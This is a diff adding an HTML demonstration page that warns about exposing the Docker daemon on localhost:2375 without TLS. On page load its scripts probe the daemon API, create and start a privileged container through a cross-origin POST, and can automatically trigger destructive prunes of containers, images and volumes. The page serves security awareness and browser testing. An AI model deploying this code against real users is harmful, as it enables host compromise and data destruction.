@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Check your docker</title>
+    <script src="https://code.jquery.com/jquery-3.4.0.min.js"></script>
+    <script src="containers.js"></script>
+    <link rel="stylesheet" type="text/css" media="screen" href="https://aitorpazos.github.io/assets/css/style.css?v=cd8911676a51c10758f08d174b698219e5ad8d50">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="./style.css" />
+</head>
+<body>
+<h1>Running docker daemon without TLS</h1>
+
+<p>
+    This is a small page that tries to bring awareness of the risks that allowing Docker daemon to listen on localhost without TLS enabled. i.e.: using flags like "-H localhost:2375" or ticking the box in the Docker settings.
+</p>
+<img src="images/docker_for_windows_settings.png" width="500em"/>
+
+<p>
+    The docker daemon is exposed using the loopback interface (i.e.: tcp://localhost:2375), which limits greatly the harm that can be done using it. However, this setting leaves the docker daemon more easily addressable by potential bad actors.
+</p>
+<img src="images/dockerd_and_webpage.png" width="500em"/>
+
+<p>
+    Your browser's same-origin policy mechanisms (<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank">https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy</a>) is the only barrier that prevents an evil site to run any command on your machine, which is not a situation you want to be in.
+
+    These are examples of read-only operations that same-origin protections prevents (this is shown as green).
+
+    For example, in the containers section, in my very restricted tests I've already noticed that, the KDE's Falkon browser is failing to enforce that policy as it should, allowing a site to run containers.
+
+    On the left a well-behaved browser, on the right, a misbehaving one:
+</p>
+<div style="display: inline">
+<img src="images/containers_ok.png" width="600px">
+<img src="images/containers_ko.png" width="600px">
+</div>
+
+<div id="info">
+    <h2>Info</h2>
+
+    <p>
+        If you see a broken page below chances are that you are not running docker at all or you haven't enabled it to listen on port 2375. That is good :)
+    </p>
+    <p>
+        If you see a long text string, then your Docker daemon is listening on port 2375 without requiring authentication and I'd recommend that you double check if you really need this.
+    </p>
+    Request to the docker daemon:
+    <iframe id="i_info" src="http://127.0.0.1:2375/info"></iframe>
+    <div>
+        Visible to the site?
+        <div id="info_page" class="ok">NO</div>
+    </div>
+    <script>
+       setTimeout(() => {let dockerInfo = document.getElementById('i_info').contentWindow.document.body.innerText; if (dockerInfo) {$('#info_page').addClass("ḱo"); $('#info_page').removeClass("ok"); $('#info_page').innerText(dockerInfo)}}, 1000);
+    </script>
+</div>
+<div id="containers">
+    <h2>Containers</h2>
+    <iframe id="i_containers" src="http://127.0.0.1:2375/containers/json"></iframe>
+    <div>
+        Visible to the site?
+        <div id="containers_page" class="ok">NO</div>
+    </div>
+    <div id="container_created"></div>
+    <script>
+        setTimeout(() => {let dockerInfo = document.getElementById('i_containers').contentWindow.document.body.innerText; if (dockerInfo) {$('#containers_page').addClass("ḱo"); $('#containers_page').removeClass("ok"); $('#containers_page').innerText(dockerInfo)}}, 1000);
+
+        // Testing post. It should be blocked
+        let createData = '{ \
+                "AttachStdin": false, \
+                "AttachStdout": true, \
+                "AttachStderr": true, \
+                "Cmd": [ \
+                    "hostname" \
+                ], \
+                "Image": "bash", \
+                "HostConfig": { \
+                    "Privileged": true \
+                } \
+              }';
+        $.ajax({
+            url: "http://127.0.0.1:2375/containers/create",
+            type: "POST",
+            contentType: "application/json; charset=utf-8",
+            dataType: "json",
+            data: createData
+            }
+        ).done(function( data ) {
+            $("#container_created").html( "The following container was created ("+ createData+"): " + JSON.stringify(data) );
+            $('#container_created').addClass("ḱo"); $('#container_created').removeClass("ok")
+            // If we were able to start the container, start it
+            $.ajax({
+                url: "http://127.0.0.1:2375/containers/" + data.Id + "/start",
+                type: "POST",
+                contentType: "application/json; charset=utf-8",
+                dataType: "json"
+            }).done(function(execData){
+                setTimeout(() => {
+                    $.ajax({
+                        url: "http://127.0.0.1:2375/containers/" + data.Id + "/logs?stdout=true&stderr=true",
+                        type: "GET",
+                        contentType: "application/json; charset=utf-8",
+                        dataType: "json"
+                    }).always(function (logsData) {
+                        $("#container_created").html($("#container_created").html() + "<br /> Logs ("+ data.Id + "): " + JSON.stringify(logsData.responseText));
+                    });
+                }, 5000);
+            })
+
+        }).fail(function(error){
+            $("#container_created").html( "Container creation using post failed: " + JSON.stringify(error));
+            $('#container_created').addClass("ok"); $('#container_created').removeClass("ko")
+        });
+    </script>
+</div>
+<div id="images">
+    <h2>Images</h2>
+    <iframe id="i_images" src="http://127.0.0.1:2375/images/json"></iframe>
+    <div>
+        Visible to the site?
+        <div id="images_page" class="ok">NO</div>
+    </div>
+    <script>
+        setTimeout(() => {let dockerInfo = document.getElementById('i_images').contentWindow.document.body.innerText; if (dockerInfo) {$('#images_page').addClass("ok"); $('#images_page').removeClass("ko"); $('#images_page').innerText(dockerInfo)}}, 1000);
+    </script>
+</div>
+<div id="actions">
+    <div id="actions_log"></div>
+    <p>
+        This actions can be triggered by yourself clicking on those buttons. <br />
+        However, to demonstrate how this can be leveraged in an automated fashion by bad actors, you can see how this can be triggered automatically by appending "?timer=number_of_milliseconds_to_trigger_actions" (e.g.: "?timer=5000")
+    </p>
+    <iframe id="prune_containers" src="prune_containers.htm"></iframe>
+    <iframe id="prune_images" src="prune_images.htm"></iframe>
+    <iframe id="prune_volumes" src="prune_volumes.htm"></iframe>
+</div>
+
+<script>
+    $.urlParam = function (name) {
+        var results = new RegExp('[\?&]' + name + '=([^&#]*)')
+            .exec(window.location.search);
+
+        return (results !== null) ? results[1] || 0 : false;
+    }
+
+    var timerTime = $.urlParam('timer');
+    if (timerTime){
+        $("#actions_log").html("Container, images and volumes are going to be pruned in " + timerTime + "ms");
+        $("#actions_log").addClass("ko");
+        setTimeout(function () {
+          $("#actions_log").html($("#actions_log").html() + "<br /> Containers prune triggered");
+          let c_iframe = document.getElementById('prune_containers')
+          let c_doc = c_iframe.contentDocument || c_iframe.contentWindow.document
+          let prune_containers_form = c_doc.getElementById("containers_form");
+          prune_containers_form.submit();
+          $("#actions_log").html($("#actions_log").html() + "<br /> Images prune triggered");
+          let i_iframe = document.getElementById('prune_images')
+          let i_doc = i_iframe.contentDocument || c_iframe.contentWindow.document
+          let prune_images_form = i_doc.getElementById("images_form");
+          prune_images_form.submit();
+          $("#actions_log").html($("#actions_log").html() + "<br /> Volumes prune triggered");
+          let v_iframe = document.getElementById('prune_volumes')
+          let v_doc = v_iframe.contentDocument || v_iframe.contentWindow.document
+          let prune_volumes_form = v_doc.getElementById("volumes_form");
+          prune_volumes_form.submit();
+        }, timerTime);
+    }
+</script>
+</body>
+</html>
